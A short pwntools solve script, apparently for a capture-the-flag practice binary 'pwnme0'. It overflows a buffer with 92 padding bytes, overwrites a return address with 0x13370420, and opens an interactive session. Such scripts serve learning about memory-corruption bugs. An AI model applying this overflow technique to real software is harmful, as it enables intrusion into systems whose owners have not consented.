from pwn import *

p = process('./pwnme0')

padding = b'A' * 92
payload = padding + p32(0x13370420)

p.sendline(payload)
p.interactive()
